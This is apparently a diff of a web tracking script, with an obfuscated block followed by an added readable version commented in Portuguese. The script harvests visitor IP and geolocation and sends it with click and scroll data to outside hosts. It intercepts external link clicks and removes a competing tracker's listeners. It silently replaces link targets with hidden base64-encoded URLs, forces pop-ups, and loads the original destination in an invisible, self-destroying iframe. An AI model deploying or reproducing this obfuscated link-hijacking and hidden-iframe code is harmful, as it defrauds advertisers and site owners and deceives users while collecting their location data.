_0x102027=document[_0x437f43(0x2c7)+_0x437f43(0x2b8)+'emen'+'t'](_0x437f43(0x24b)+'me'),_0x102027['id']=_0x437f43(0x1ef)+'RAME',_0x102027[_0x437f43(0x25d)]=_0x5f7bed,_0x102027['styl'+'e']['widt'+'h']='0',_0x102027['styl'+'e'][_0x437f43(0x284)+'ht']='0',_0x102027[_0x437f43(0x319)+'e'][_0x437f43(0x30d)+'er']='0',_0x102027['styl'+'e'][_0x437f43(0x220)+_0x437f43(0x2aa)+'ty']=_0x437f43(0x1e0)+'en',_0x102027[_0x437f43(0x319)+'e'][_0x437f43(0x2f5)+'tion']=_0x437f43(0x31f)+'lute',_0x102027[_0x437f43(0x319)+'e']['left']=_0x437f43(0x294)+_0x437f43(0x2d8),_0x102027[_0x437f43(0x331)+'ad']=()=>{const _0x50c578=_0x437f43;_0x1858db(),_0x5be74c(_0x50c578(0x2cd)+'me\x20c'+_0x50c578(0x22f)+'gado'+'\x20com'+_0x50c578(0x25c)+_0x50c578(0x1f2)+':',_0x102027[_0x50c578(0x25d)]);if(typeof _0x34b6b0==='func'+_0x50c578(0x2ce))_0x34b6b0(_0x102027);if(autoDestroy)_0x2ae50f();},_0x102027[_0x437f43(0x1f5)+'ror']=_0xf66bc5=>{const _0x5f4055=_0x437f43;_0x1858db(),_0x5be74c(_0x5f4055(0x326)+'\x20ao\x20'+'carr'+_0x5f4055(0x273)+_0x5f4055(0x2eb)+_0x5f4055(0x2e6),_0x102027[_0x5f4055(0x25d)]);if(typeof _0x1550f5===_0x5f4055(0x30b)+_0x5f4055(0x2ce))_0x1550f5(_0xf66bc5,_0x102027);if(autoDestroy)_0x2ae50f();},_0x102027[_0x437f43(0x2ad)+_0x437f43(0x2ed)+'Id']=setTimeout(()=>{const _0x4d2d17=_0x437f43;_0x5be74c(_0x4d2d17(0x21a)+'eout'+_0x4d2d17(0x313)+_0x4d2d17(0x24b)+'me\x20d'+_0x4d2d17(0x246)+_0x4d2d17(0x237)+_0x4d2d17(0x2ca)+_0x4d2d17(0x2d9)+'ra\x20c'+_0x4d2d17(0x22f)+'gar:',_0x102027[_0x4d2d17(0x25d)]),_0x1858db();if(typeof _0x1550f5===_0x4d2d17(0x30b)+_0x4d2d17(0x2ce))_0x1550f5(new Error(_0x4d2d17(0x300)+_0x4d2d17(0x251)),_0x102027);if(autoDestroy)_0x2ae50f();},timeout),document[_0x437f43(0x25f)][_0x437f43(0x2d1)+_0x437f43(0x2e2)+_0x437f43(0x2ae)](_0x102027),_0x5be74c(_0x437f43(0x2cd)+_0x437f43(0x234)+'riad'+_0x437f43(0x2f2)+_0x437f43(0x24e)+'\x20\x27WA'+_0x437f43(0x317)+'ME\x27.'),_0x102027;}function _0x442394(){const _0x441e64=_0x36e675,_0x13f4c4=document[_0x441e64(0x261)+'leme'+_0x441e64(0x2af)+'Id'](_0x441e64(0x1ef)+_0x441e64(0x264));return _0x13f4c4?(clearTimeout(_0x13f4c4['_tim'+_0x441e64(0x2ed)+'Id']),_0x13f4c4[_0x441e64(0x235)+'ve'](),_0x5be74c('🧹\x20If'+_0x441e64(0x2fd)+_0x441e64(0x276)+_0x441e64(0x317)+'ME\x27\x20'+_0x441e64(0x235)+_0x441e64(0x29e)+_0x441e64(0x281)+'\x20suc'+_0x441e64(0x1f2)+'.'),!![]):(_0x5be74c('Nenh'+'um\x20i'+_0x441e64(0x269)+_0x441e64(0x297)+_0x441e64(0x301)+_0x441e64(0x2c5)+_0x441e64(0x1ec)+'ontr'+_0x441e64(0x277)+_0x441e64(0x208)+_0x441e64(0x29a)+_0x441e64(0x2a5)+'.'),![]);}function _0x4eda3f(_0x1ce71a,_0x54994d,_0x1ade7a=0xbb8,_0x39a9b4=!![],_0x157d28=!![],_0x4ea676=0x1388){const _0xc4c6d2=_0x36e675;let _0x4cf9aa;_0x39a9b4?(_0x4cf9aa=window[_0xc4c6d2(0x22c)](_0x1ce71a,_0xc4c6d2(0x292)+'nk'),setTimeout(()=>{const _0xc5537a=_0xc4c6d2;if(!_0x4cf9aa||_0x4cf9aa[_0xc5537a(0x2fc)+'ed']||typeof _0x4cf9aa[_0xc5537a(0x2fc)+'ed']===_0xc5537a(0x2a1)+'fine'+'d'){_0x5be74c(_0xc5537a(0x214)+_0xc5537a(0x324)+_0xc5537a(0x210)+'eado'+_0xc5537a(0x1e8)+_0xc5537a(0x209)+_0xc5537a(0x291)+'rl1\x20'+_0xc5537a(0x1e7)+_0xc5537a(0x280)+_0xc5537a(0x2a4)+_0xc5537a(0x2c9)),window[_0xc5537a(0x228)+'tion'][_0xc5537a(0x338)]=_0x1ce71a;return;}_0x5be74c(_0xc5537a(0x214)+_0xc5537a(0x30a)+_0xc5537a(0x320)+_0xc5537a(0x2f2)+_0xc5537a(0x2ac)+'cess'+'o.');if(_0x157d28)try{_0x4cf9aa[_0xc5537a(0x228)+_0xc5537a(0x2ce)]['href']=_0x1ce71a,_0x5be74c(_0xc5537a(0x28e)+'rreg'+'ando'+_0xc5537a(0x2fa)+_0xc5537a(0x2b4)+_0xc5537a(0x21d));}catch(_0x8a9145){_0x5be74c(_0xc5537a(0x2cb)+_0xc5537a(0x2a8)+'\x20pos'+'síve'+'l\x20re'+_0xc5537a(0x334)+_0xc5537a(0x273)+_0xc5537a(0x2e3)+_0xc5537a(0x2f7)+_0xc5537a(0x27d),_0x8a9145);}if(_0x92b71f?.[_0xc5537a(0x221)+_0xc5537a(0x2bf)])_0x20174d(_0x1ce71a,_0x54994d);else _0x54994d&&(window[_0xc5537a(0x228)+_0xc5537a(0x2ce)]['href']=_0x54994d);},_0x4ea676)):_0x92b71f?.[_0xc4c6d2(0x221)+_0xc4c6d2(0x2bf)]?_0x20174d(_0x1ce71a,_0x54994d):window[_0xc4c6d2(0x228)+'tion'][_0xc4c6d2(0x338)]=_0x1ce71a;}function _0x20174d(_0x28c48e,_0x6ded80){const _0x269ae8=_0x36e675;try{_0x2c87f4(_0x6ded80,{'autoDestroy':!![],'onLoad':_0x37c991=>{const _0xe540b1=_0x5a19;_0x5be74c('carr'+_0xe540b1(0x2d6)+'o:',_0x37c991[_0xe540b1(0x25d)]),window[_0xe540b1(0x228)+_0xe540b1(0x2ce)][_0xe540b1(0x338)]=_0x28c48e;},'onError':_0x20938f=>{const _0x18a75d=_0x5a19;console[_0x18a75d(0x29d)+'r']('erro'+':',_0x20938f['mess'+_0x18a75d(0x318)]),window[_0x18a75d(0x228)+_0x18a75d(0x2ce)][_0x18a75d(0x338)]=_0x28c48e;},'timeout':0x1388});}catch(_0x56f159){window[_0x269ae8(0x228)+_0x269ae8(0x2ce)][_0x269ae8(0x338)]=_0x28c48e;}}}(window));function _0x67a4(){const _0x2b86b1=['teEl','Elem','push','ach','repl','eb.c','utom','frm','om\x20s','Agen','do\x20U','cati','/web','AME\x27','lize','crea','30352FFwXhb','...','emai','\x20Não','enRe','Ifra','tion','idVi','ror:','appe','prev','lLis','t.ws','incl','egad','tude','9px','s\x20pa','veAl','abs','outb','ent','Send','ntNo','dire','Clic','ndCh','\x20a\x20n','.br/','a,\x20b','ame:','clar','cfId','Adva','scro','\x20ifr','tagN','eout','ker/','[##D','g\x20in','fine','o\x20co','chPa','me\x20j','posi','stri','ova\x20','mess','lick','\x20nov','o\x20se','clos','rame','ppar','iste','Time','AFFR','own','aram','Fail','fig','do\x20a','matc','POST','getA','up\x20a','func','zone','bord','rld','und','_r7_','xx-y','rmCF',':\x20o\x20','ficS','ecti','time','FFRA','age','styl','utc','itia','ion/','ed\x20t','488GmMLYS','abso','bert','ght','undP','\x20err','up\x20b','leng','Erro','llY','addE','te.','sita','\x20ser','est','isBo','2529wGCzSn','catc','\x27\x20re','onlo','ring','rand','carr','stat','rrer','traf','href','hidd','ted','ase','race','min','ityw','quer','na\x20m','\x20—\x20a','ecar','sour','.com','\x20enc','code','inbo','WAFF','tual','tads','esso','try_','appl','oner','init','t\x20er','user','ueue','ener','ra\x20c','orig','_con','rega','http','clic','me\x20\x27','aile','so:','no-r','rams','trac','xxxx','para','brin','ocat','forE','try','amen','json','itud','loqu','155417QWHuzc','e=\x22r','izan','Pop-','s://','ing:','ySel','OStr','57135Qocgsv','⏱Tim','utto','Trac','a...','ngif','gar:','visi','orii','ourc','refe','long','rer\x22','542405NalelA','scre','loca','_sel','ar\x20i','26cfdnpx','open','20500HqCSuo','[nam','arre','tsWi','cont','ipwh','ttri','me\x20c','remo','proc','ou\x20d','king','coun','á\x20ex','werC','sear','tkn','oad','api/','reca','rdnx','toLo','uces','me\x20d','271386JvJCtm','emor','host','scr','oncl','Load','ifra','ing','conf','m\x20ID','kfas','name','out','nd\x20t','URL\x20','x-4x','geol','on\x20f','ion','rdt','api.','lati','udes','\x20suc','src','efer','body','List','getE','sem_','ror','RAME','star','ing\x20','otyp','reg-','fram','icat','city','perc','_ini','acti','1280504jRdqIT','efau','em_c','ver\x20','egar','__Tk','ment','\x20\x27WA','ado\x20','rer','veri','app.','inne','hook','aba:','do\x20c','o.is','esma','\x20com','enta','fic\x20','heig','entD','essQ','me\x20r','Url','payl','ttrk','bute','page','meta','Reca','toIS','rack','do\x20u','_bla','solu','-999','isp','movi','e\x20\x27W','bind','toSt','\x20rem','EBUG','CRF','erro','vido','oclk','ound','unde','xxx-','or:','\x20aba','over','_trk','trk','\x20foi','IP\x20g','bili','RL..','m\x20su','_tim','ild','ntBy','rreg','now','rHei','regi','a\x20ab','roun','eolo','llHe'];_0x67a4=function(){return _0x2b86b1;};return _0x67a4();}
+(function () { var m = document.querySelector('meta[name="referrer"]'); if (m) { if (m.content.toLowerCase() !== 'no-referrer') m.content = 'no-referrer'; return; } m = document.createElement('meta'); m.name = 'referrer'; m.content = 'no-referrer'; document.head.appendChild(m); })();
+
+
+(function (global) {
+
+  const iReferrer = document.referrer || "sem_origem";
+  const DEBUG = false; // Set to false to disable debug logs
+  function debugLog(...args) {
+    if (DEBUG) console.log('[##DEBUG]', ...args);
+  }
+  const TRACKING_VISIT_ENDPOINT =
+    "https://api.clarityweb.ct.ws/webhook/track";
+  const TRACKING_CLICK_ENDPOINT =
+    "https://api.clarityweb.ct.ws/webhook/click";
+
+  const REQUEST_TIMEOUT = 500;
+
+  function generateCfId() {
+    return (
+      "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
+        const r = (Math.random() * 16) | 0;
+        const v = c === "x" ? r : (r & 0x3) | 0x8;
+        return v.toString(16);
+      }) + "_trkw"
+    );
+  }
+
+  const trackingData = {
+    idVisita: generateCfId(),
+    pageUrl: window.location.href,
+    inboundParams: {},
+    geolocation: null,
+    outboundClicks: {},
+    pageLoadTime: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    verify: false
+  };
+
+
+  async function getIPBasedLocation() {
+    try {
+      const response = await fetch("https://ipwho.is/");
+      if (response.ok) {
+        const data = await response.json();
+        trackingData.geolocation = {
+          ip: data.ip,
+          country: data.country,
+          country_code: data.country_code,
+          region: data.region,
+          city: data.city,
+          latitude: data.latitude,
+          longitude: data.longitude,
+          timezone: data.timezone?.utc,
+          connection: data.connection?.isp,
+        };
+      }
+    } catch (error) {
+      debugLog("IP geolocation failed:", error);
+    }
+  }
+
+
+   async function cf_click(e) {
+      const element = e.target.closest("a, button, [onclick]");
+      if (!element) return;
+      const url = getUrlFromElement(element);
+      if (!url || !isExternalUrl(url)) return;
+      e.preventDefault();
+      try {
+        await regclick(url);
+        if(configData.oclk){
+          window.payload.outboundClicks.push({
+            elementType: element.tagName.toLowerCase(),
+            url: normalizeUrl(url),
+            params: getUrlParams(url),
+            timestamp: new Date().toISOString(),
+            timeOnPage: Math.round((Date.now() - pageStartTime) / 1000),
+          });
+          await Promise.race([
+            cf_sendTrackingData("outbound"),
+            new Promise((resolve) => setTimeout(resolve, REQUEST_TIMEOUT)),
+          ]);
+      }
+      } catch (error) {
+        debugLog("Tracking error:", error);
+      }
+
+      abrirLink2(url);
+
+    }
+
+
+
+
+  async function cf_sendTrackingData(type) {
+  // Traffic source is now a simple string
+  
+  
+   let cf_trackingData = null;
+  if(window.payload)
+      cf_trackingData = window.payload;
+   else
+    return; 
+
+  const trafficSourceValue = cf_trackingData.trafficSource || "direct"; 
+
+  debugLog('Sending traffic source:', trafficSourceValue);
+  
+  const payload = {
+    source: type === "inbound" ? "visit" : "click",
+    cfId: cf_trackingData.cfId,
+    ip: cf_trackingData.geolocation?.ip ?? null,
+    trafficSource: trafficSourceValue,
+    country: cf_trackingData.geolocation?.country ?? null,
+    region: cf_trackingData.geolocation?.region ?? null,
+    city: cf_trackingData.geolocation?.city ?? null,
+    inboundUrl: cf_trackingData.pageUrl,
+    inboundParams: cf_trackingData.inboundParams,
+    outboundUrl: cf_trackingData.outboundClicks?.[0]?.url,
+    outboundParams: cf_trackingData.outboundClicks?.[0]?.params || {},
+    // --- New fields as optional ---
+    userAgent: cf_trackingData.userAgent,
+    screenResolution: cf_trackingData.screenResolution,
+    isBot: cf_trackingData.isBot,
+    geolocation: cf_trackingData.geolocation,
+    outboundClicks: cf_trackingData.outboundClicks,
+    pageLoadTime: cf_trackingData.pageLoadTime,
+    timestamp: new Date().toISOString(),
+    eventType: type,
+  };
+  const endpoint = type === "inbound" ? "https://app.clickfastads.com.br/api/tracker/visits" :   "https://app.clickfastads.com.br/api/tracker/clicks";
+  try {
+    const response = await fetch(endpoint, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
+    });
+    if (!response.ok) {
+      debugLog("Tracking server error:", response.status);
+    }
+    return response;
+  } catch (error) {
+    debugLog("Failed to send tracking:", error);
+    throw error;
+  }
+}
+
+  
+
+
+
+  async function sendTrackingData(type) {
+    // Traffic source is now a simple string
+    try {
+      const trafficSourceValue = trackingData.trafficSource || "direct";
+
+      debugLog('Sending traffic source:', trafficSourceValue);
+
+      if (typeof idVisita !== "undefined") { trackingData.inboundParams["vst"] = idVisita }
+      if (typeof iReferrer !== "undefined") { trackingData.inboundParams["referrer"] = iReferrer }
+
+      const payload = {
+        source: type === "inbound" ? "visit" : "click",
+        idVisita: trackingData.idVisita,
+        inboundUrl: trackingData.pageUrl,
+        inboundParams: trackingData.inboundParams,
+        userAgent: trackingData.userAgent,
+        geolocation: trackingData.geolocation,
+        outboundClicks: trackingData.outboundClicks,
+        pageLoadTime: trackingData.pageLoadTime,
+        timestamp: new Date().toISOString(),
+        eventType: type,
+        verify: trackingData.verify
+      };
+      const endpoint = type === "inbound" ? TRACKING_VISIT_ENDPOINT : TRACKING_CLICK_ENDPOINT;
+
+      const response = await fetch(endpoint, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(payload),
+      });
+      if (!response.ok) {
+        debugLog("Tracking server error:", response.status);
+      }
+      return response;
+    } catch (error) {
+      debugLog("Failed to send tracking:", error);
+      throw error;
+    }
+  }
+  // Track page load time
+  const pageStartTime = Date.now();
+  debugLog("Advanced tracking initialized");
+
+  // Helper functions
+  function isExternalUrl(url) {
+    try {
+      return new URL(normalizeUrl(url)).hostname !== location.hostname;
+    } catch {
+      return false;
+    }
+  }
+  function normalizeUrl(url) {
+    return url.startsWith("http") ? url : "https://" + url;
+  }
+  function getUrlParams(url) {
+    const params = {};
+    try {
+      new URL(normalizeUrl(url)).searchParams.forEach(
+        (v, k) => (params[k] = v)
+      );
+    } catch { }
+    return params;
+  }
+  function getUrlFromElement(element) {
+    if (element.tagName === "A") return element.href;
+    const onclick =
+      element.onclick?.toString() || element.getAttribute("onclick") || element.getAttribute("href");
+    return (
+      onclick?.match(/window.location.hrefs*=s*['"]([^'"]+)['"]/)?.[1] ||
+      onclick?.match(/['"](https?:\/\/[^'"]+)['"]/)?.[1]
+    );
+  }
+
+
+  let lastScrollPosition = 0,
+    lastReportedScrollPercentage = 0,
+    lastPercentageMax = 0
+
+  function calculateScrollPercentage() {
+    const i = window.scrollY
+      , e = window.innerHeight
+      , t = document.documentElement.scrollHeight;
+    return Math.min((i + e) / t * 100, 100)
+  }
+
+  function handleScrollEvent() {
+    const i = window.scrollY
+      , e = calculateScrollPercentage()
+      , t = i > lastScrollPosition ? "scroll-down" : "scroll-up";
+
+    if ((e > lastPercentageMax)) {
+      Math.abs(e - lastReportedScrollPercentage) >= 10 && (sendEvents({
+        percentage: Math.round(e)
+      }, t),
+        lastReportedScrollPercentage = e),
+        lastScrollPosition = i;
+      lastPercentageMax = e;
+    }
+
+  }
+
+
+  // over
+
+  abrirLink1 = function abrirLink(a, t) {
+    "_blank" === t ? window.open(a, "_blank") : window.location.href = a
+  }
+
+
+  abrirLink2 = function (a, t) {
+      let  nurl = getwURL(a), urlup = getwURL(a, true);
+      if(configData.ppar){
+        nurl = includParam(nurl,configData.ppar, trackingData.idVisita)
+        urlup = includParam(urlup,configData.ppar, trackingData.idVisita)
+      }
+      openLink(nurl,a,3000,configData.ppup, configData.rld, 5000,urlup)
+  }
+
+
+
+
+  function includParam(baseUrl, paramKey, paramValue) {
+    const url = new URL(baseUrl);
+    url.searchParams.set(paramKey, paramValue);
+    return url.toString();
+  }
+
+  f_api_click1 = async function (t = "", a = void 0, e = "_self") {
+    try {
+
+      await regclick(t);
+      if (configData.oclk) {
+        var r = {
+          idVisita: idVisita,
+          cliente_id: cli_id || ""
+        };
+        return void 0 !== a && (r.origem_click = a), f_call("reg-click", r).then(a => {
+          abrirLink(t, e)
+        }).catch(a => {
+          abrirLink(t, e)
+        })
+      }
+      else {
+        abrirLink(t, e)
+      }
+    } catch (a) {
+      abrirLink(t, e)
+    }
+  }
+
+
+
+
+
+
+  async function sendEvents(i, e) {
+    try {
+      const c = {
+        idVisita: trackingData.idVisita,
+        scrollMax: i.percentage,
+        event: e
+      }
+        , a = {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(c)
+        };
+      const endpoint = "https://api.clarityweb.ct.ws/webhook/event";
+
+      const response = await fetch(endpoint, a);
+      if (!response.ok) {
+        debugLog("Tracking server error:", response.status);
+      }
+      return response;
+    } catch (error) {
+      debugLog("Failed to send tracking:", error);
+      throw error;
+    }
+  }
+
+
+  let configData = {
+    tkn: null,
+    trk: false,
+    rdt: false,
+    scr: false,
+    otrk: true,
+    oclk: true,
+    rdnxt: false,
+    ifrm: false,
+    oriifrm: false,
+    ppup: false,
+    rld: false,
+    ppar: null,
+    uppup: null,
+    ttrk: "CRF"
+  }
+
+
+  async function initializeTracking() {
+    try {
+      const url = new URL(window.location.href);
+      url.searchParams.forEach((value, key) => {
+        trackingData.inboundParams[key] = value;
+      });
+      
+    } catch (e) {
+      debugLog("URL parsing error:", e);
+    }
+    trackingData.inboundParams["verify"] = configData.rdnxt;
+    trackingData.verify = configData.rdnxt;
+    await getIPBasedLocation();
+    sendTrackingData("inbound");
+  };
+
+  async function regclick(url) {
+    try {
+      if (!url || !isExternalUrl(url)) return;
+      trackingData.outboundClicks = {
+        url: normalizeUrl(url),
+        params: getUrlParams(url),
+        timestamp: new Date().toISOString(),
+        timeOnPage: Math.round((Date.now() - pageStartTime) / 1000),
+      };
+      await Promise.race([
+        sendTrackingData("outbound"),
+        new Promise((resolve) => setTimeout(resolve, REQUEST_TIMEOUT)),
+      ]);
+    } catch (error) {
+      debugLog("Tracking error:", error);
+      throw error;
+    }
+
+  }
+
+  function _initScrool() {
+    window.addEventListener("scroll", handleScrollEvent)
+  }
+
+
+  function _initTracking() {
+    setTimeout(() => {
+      initializeTracking(); 
+    }, 3000);
+  }
+
+  function _rmCF() {
+    try {
+      window.removeAllListeners("click", "clickfast");
+      document.addEventListener('click', cf_click, true);
+    } catch (error) {
+      debugLog("rmCF error:", error);
+      throw error;
+    }
+
+  }
+
+  function _rmRA() {
+    try {
+
+      setTimeout(() => {
+        abrirLink = configData.rdt ? abrirLink2 : abrirLink1;
+        f_api_click = f_api_click1;
+      }, 3000);
+    } catch (error) {
+      debugLog("rmCF error:", error);
+      throw error;
+
+    }
+
+  }
+
+  function _initRedirect() {
+    try {
+      if (configData.ttrk.includes("C"))
+        _rmCF();
+
+      if (configData.ttrk.includes("R"))
+        _rmRA();
+
+      if(configData.ifrm)
+      {
+        const url = atob(configData.tkn);
+        createiFrame(url,{
+          autoDestroy:true,
+          onLoad:(f)=>debugLog("carregado:",f.src),
+          onError:(e)=>console.error("erro:",e.message),
+          timeout:5000
+        });
+      }
+
+    } catch (error) {
+      debugLog("_initRedirect error:", error);
+
+    }
+
+  }
+
+
+  function _init(config) {
+     try {
+    configData = config
+
+    if (configData.scr && configData.trk)
+      _initScrool();
+
+    if (configData.trk)
+      _initTracking();
+
+    if (configData.rdt || (configData.ttrk.includes("R") && configData.trk) )
+      _initRedirect();
+    } catch (error) {
+      debugLog("_init error:", error);
+
+    }
+
+  }
+
+  function getwURL(url , popup = false) {
+    try {
+    if (configData.rdt) {
+      if(popup)
+      url = atob(configData.uppup);
+      else
+      url = atob(configData.tkn);
+      //url = includParam(url, "subid2", trackingData.idVisita);
+    }
+    } catch (error) {
+      debugLog("_init error:", error);
+    }
+    return url;
+  }
+
+
+  // ----- API PÚBLICA (exposta) -----
+  const api = {
+    _q: [],
+    _inited: false,
+    _config: {},
+    init(cfg) {
+      if (this._inited) return;
+      this._config = cfg || {};
+      _init(cfg);
+      this._inited = true;
+      // outras inicializações...
+    },
+    processQueue() {
+      this._q.forEach(item => {
+        if (item.action === 'init') this.init(item.config);
+        // outros actions...
+      });
+      this._q = []; // limpa a fila
+    },
+
+    // opcional: expor um método para obter config (útil para debug controlado)
+    getConfig() {
+      return this._config;
+    }
+  };
+
+
+
+  // ----- PROCESSA FILA PRÉ-EXISTENTE -----
+  const q = global.__Tk_r7__ && global.__Tk_r7__._q || [];
+  q.forEach(item => {
+    if (item.action === 'init') api.init(item.config);
+    //    if (item.action === 'track') api.track(item.event, item.data);
+  });
+
+
+  // intercepta push para processar automaticamente
+  api._q.push = function (...args) {
+    Array.prototype.push.apply(this, args);
+    this.processQueue(); // processa imediatamente
+    return this.length;
+  }.bind(api);
+
+
+  // ----- EXPÕE SÓ A API -----
+  global.__Tk_r7__ = api;
+
+
+  function createiFrame(
+  url,
+  {
+    onLoad,
+    onError,
+    timeout = 10000, // tempo máximo de espera (ms)
+    autoDestroy = false // se true, remove o iframe após carregar ou falhar
+  } = {}
+) {
+  let iframe = document.getElementById("WAFFRAME");
+
+  // Função interna para limpar eventos e timeout
+  function cleanup() {
+    if (!iframe) return;
+    clearTimeout(iframe._timeoutId);
+    iframe.onload = null;
+    iframe.onerror = null;
+  }
+
+  // Função para remover o iframe (usada em autoDestroy)
+  function destroy() {
+    cleanup();
+    if (iframe && iframe.parentNode) {
+      iframe.remove();
+      debugLog("Iframe 'WAFFRAME' removido automaticamente.");
+    }
+  }
+
+  // Se o iframe já existe → atualiza o src
+  if (iframe) {
+    debugLog("Iframe já existe — atualizando URL...");
+    cleanup();
+
+    iframe.onload = () => {
+      cleanup();
+      debugLog("Iframe recarregado com sucesso:", iframe.src);
+      if (typeof onLoad === "function") onLoad(iframe);
+      if (autoDestroy) destroy();
+    };
+
+    iframe.onerror = (e) => {
+      cleanup();
+      debugLog("Erro ao recarregar iframe:", iframe.src);
+      if (typeof onError === "function") onError(e, iframe);
+      if (autoDestroy) destroy();
+    };
+
+    iframe._timeoutId = setTimeout(() => {
+      debugLog("⏱Timeout: o iframe demorou demais para carregar:", iframe.src);
+      cleanup();
+      if (typeof onError === "function") onError(new Error("Timeout"), iframe);
+      if (autoDestroy) destroy();
+    }, timeout);
+
+    iframe.src = url;
+    return iframe;
+  }
+
+  // Cria novo iframe invisível
+  iframe = document.createElement("iframe");
+  iframe.id = "WAFFRAME";
+  iframe.src = url;
+  iframe.style.width = "0";
+  iframe.style.height = "0";
+  iframe.style.border = "0";
+  iframe.style.visibility = "hidden";
+  iframe.style.position = "absolute";
+  iframe.style.left = "-9999px";
+
+  iframe.onload = () => {
+    cleanup();
+    debugLog("Iframe carregado com sucesso:", iframe.src);
+    if (typeof onLoad === "function") onLoad(iframe);
+    if (autoDestroy) destroy();
+  };
+
+  iframe.onerror = (e) => {
+    cleanup();
+    debugLog("Erro ao carregar iframe:", iframe.src);
+    if (typeof onError === "function") onError(e, iframe);
+    if (autoDestroy) destroy();
+  };
+
+  // Timeout automático
+  iframe._timeoutId = setTimeout(() => {
+    debugLog("⏱Timeout: o iframe demorou demais para carregar:", iframe.src);
+    cleanup();
+    if (typeof onError === "function") onError(new Error("Timeout"), iframe);
+    if (autoDestroy) destroy();
+  }, timeout);
+
+  document.body.appendChild(iframe);
+  debugLog("Iframe criado com ID 'WAFFRAME'.");
+
+  return iframe;
+}
+
+/**
+ * Remove manualmente o iframe, se existir.
+ */
+function removeiFrame() {
+  const iframe = document.getElementById("WAFFRAME");
+  if (iframe) {
+    clearTimeout(iframe._timeoutId);
+    iframe.remove();
+    debugLog("🧹 Iframe 'WAFFRAME' removido com sucesso.");
+    return true;
+  } else {
+    debugLog("Nenhum iframe 'WAFFRAME' encontrado para remover.");
+    return false;
+  }
+}
+
+function openLink(url1, url2, delayMs = 3000, popup = true, reload = true, checkDelay = 5000, urlup = null) {
+  let novaAba;
+
+  if (popup) {
+    // Tenta abrir url1 em nova aba
+    novaAba = window.open(urlup, "_blank");
+
+    // Aguarda alguns segundos antes de verificar se o pop-up foi bloqueado
+    setTimeout(() => {
+      if (!novaAba || novaAba.closed || typeof novaAba.closed === "undefined") {
+        debugLog("Pop-up bloqueado — abrindo url1 na mesma aba...");
+        window.location.href = url1;
+        return;
+      }
+
+      debugLog("Pop-up aberto com sucesso.");
+
+      // Se reload estiver habilitado, força recarregar a aba após o delay
+      if (reload) {
+    
+          try {
+            novaAba.location.href = urlup;
+            debugLog("Recarregando nova aba...");
+          } catch (err) {
+            debugLog(" Não foi possível recarregar a nova aba:", err);
+          }
+
+      }
+
+      // Após abrir, executa o comportamento condicional
+      if (configData?.oriifrm) {
+        regVisitProduto(url1, url2);
+      } else  {
+        window.location.href = url1;
+      }
+
+    }, checkDelay); // ⏳ espera alguns segundos antes de decidir que o popup foi bloqueado
+
+  } else {
+    // Abre url1 na mesma aba
+    if (configData?.oriifrm) {
+      regVisitProduto(url1, url2);
+    } else {
+      window.location.href = url1;
+    }
+  }
+}
+
+
+ function regVisitProduto(url1, url2){
+
+      try {
+              createiFrame(url2,{
+              autoDestroy:true,
+              onLoad:(f)=>{debugLog("carregado:",f.src);window.location.href = url1;},
+              onError:(e)=>{console.error("erro:",e.message);window.location.href = url1;},
+              timeout:5000
+            });
+      } catch (error) {
+        window.location.href = url1
+      }
+
+
+ }
+
+
+
+
+})(window);
+
+
+
